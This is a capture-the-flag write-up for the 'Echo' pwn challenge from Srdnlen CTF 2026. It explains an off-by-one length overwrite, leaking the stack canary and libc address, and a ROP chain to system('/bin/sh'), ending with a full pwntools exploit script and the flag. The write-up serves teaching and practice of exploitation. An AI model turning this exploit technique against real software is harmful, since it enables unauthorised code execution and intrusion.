# Echo

**CTF:** Srdnlen CTF 2026 Quals\
**Category:** pwn\
**Difficulty:** easy\
**Authors:** @church (Matteo Chiesa)

## Description

> Echo is one of the most famous and simple programs on any system. Nothing can go wrong if I re-implement it, right?

## Overview

This pwn challenge is composed by an *amd64 64bit ELF* binary, protected with *canary*, *Full RELRO* and *PIE*.
> Arch:       amd64-64-little\
RELRO:      Full RELRO\
Stack:      Canary found\
NX:         NX enabled\
PIE:        PIE enabled\
SHSTK:      Enabled\
IBT:        Enabled\
Stripped:   No

It does not come with a specific libc.

The behavior of the program is an echo machine: takes an input and prints it back, until an empty string is sent.

## Solution

### Vulnerability

The most interesting function to check for vulnerability is the one that handles the user input, `read_stdin()`. This in fact has a vulnerability: **it reads one byte more than it should do**. We can override the byte allocated after the buffer where we are writing. That is exactly the 8-bit integer passed to the input function, that determines how many bytes to read.
Overriding that integer with a larger number, the next operation can read many more bytes that the buffer length, overflowing it much more, potentially controlling the operational flow of the program.

### Project the exploit

The protections in the binary make the exploit not so trivial, but not difficult at all.

First of all, to override the return address, we need to override also the canary. But it needs to be the correct one, so we need to leak the canary.
We can override the first byte of the canary, which is a null-terminator character, and the next print will leak the whole canary.

Then we can override the `echo()` and `main()` stack frames to leak also the `main()` return address, which points to the libc. This address is subject to ARSL, but the less-significant 3 nibble are constant. We don't know which libc version the server uses, so we can use the **libc database** to search for it, filtering by the `__libc_start_main_ret`.

After we retrieve the correct libc, we can create our actual ROP, where we call `system("/bin/sh")`

### Retrieve the libc

The return address of the `main()` ends in `0x1ca`, so we can search for `__libc_start_main_ret == 0x1ca` in [libc.rip](https://libc.rip)

This has returned 10 different libc versions, but are all strange versions, with notations like `omv4090` or `experimental`. These are real libc version, but not so standard. In fact, if we try each of those, no one gives us any result.

This is due to a [libc.rip](https://libc.rip) limitation: it only returns the first 10 libc versions that it found, not all of them.
We can overcome this limitation using other similar tool: [libc blukat](https://libc.blukat.me/). This returns more standard libc versions, and there we can found that the server **libc version is 2.39-\*ubuntu\***. We can take them to try them out. For the most, all of these versions are equal.

### Exploit

Finally we are able to write our exploit as illustrated before.

```py
# Override buffer length
rop = ROP(exe, libc)
rop.pad(64)
rop.raw(b"\x48") # length of the next payload
io.sendafter(b"echo ", bytes(rop))

# Leak canary
rop = ROP(exe, libc)
rop.pad(64)
rop.raw(b"\x77") # length of the next payload
rop.pad(7)
rop.raw(b"\xff") # override canary null-terminator
io.sendafter(b"echo ", bytes(rop))
io.recvuntil(b"\xff")
canary = int.from_bytes(b"\0" + io.recvn(7), byteorder="little")
print("canary:", hex(canary))

# Leak libc base
rop = ROP(exe, libc)
rop.pad(64)
rop.raw(b"\xf8") # long read
rop.pad(7)
rop.pad(8) # canary placeholder
rop.pad(8)
rop.pad(8)
rop.pad(16)
rop.pad(7)
rop.raw(b"\xff") # after this there is the main return address
io.sendafter(b"echo ", bytes(rop))
io.recvuntil(b"\xff")
libc.address = int.from_bytes(io.recvn(6), byteorder="little") - 0x02a1ca
print("ASLR:", hex(libc.address))

# Actual ROP too system("/bin/sh")
rop = ROP(exe, libc)
rop.raw(b"\0")
rop.pad(63)
rop.raw(b"\xf8")
rop.pad(7)
rop.raw(canary)
rop.pad(8)
rop.add_ret()
rop.call("system", "/bin/sh")
io.sendlineafter(b"echo ", bytes(rop))

io.interactive()
```

**srdnlen{1_Byt3_70_Rul3_7h3m_4ll,_1_Byt3_70_F1nd_7h3m,_1_Byt3_70_Br1n6_7h3m_4ll_4nd_1n_7h3_D4rkn355_B1nd_7h3m}**
